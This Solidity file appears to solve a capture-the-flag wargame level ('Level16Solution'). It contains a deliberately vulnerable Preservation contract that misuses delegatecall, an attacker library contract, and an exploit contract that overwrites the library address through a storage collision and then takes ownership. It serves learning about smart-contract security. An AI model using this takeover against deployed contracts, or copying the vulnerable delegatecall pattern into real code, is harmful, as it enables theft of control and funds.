// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(
        address _timeZone1LibraryAddress,
        address _timeZone2LibraryAddress
    ) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        console.log("Calling setFirstTime: ", _timeStamp);
        timeZone1Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        console.log("Calling LibracyContract setTime: ", _time);
        storedTime = _time;
    }
}

contract AttackLibraryContract {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        console.log("Calling AttackLibracyContract setTime: ", _time);
        // will truncate a padded bytes32 value of an address
        owner = tx.origin;
    }
}

contract Level16Solution is Ownable {
    Preservation target;
    AttackLibraryContract public attackLibrary;
    address public attackLibraryAddress;

    constructor(address _target, address _attackLibrary) {
        target = Preservation(_target);
        attackLibrary = AttackLibraryContract(_attackLibrary);
        attackLibraryAddress = _attackLibrary;
    }

    function attack() public onlyOwner {
        uint256 _time = uint256(uint160(address(attackLibrary)));
        console.log("timeZone1Library before: ", target.timeZone1Library());
        target.setFirstTime(_time);
        console.log("timeZone1Library after: ", target.timeZone1Library());
        target.setFirstTime(0);
    }
}
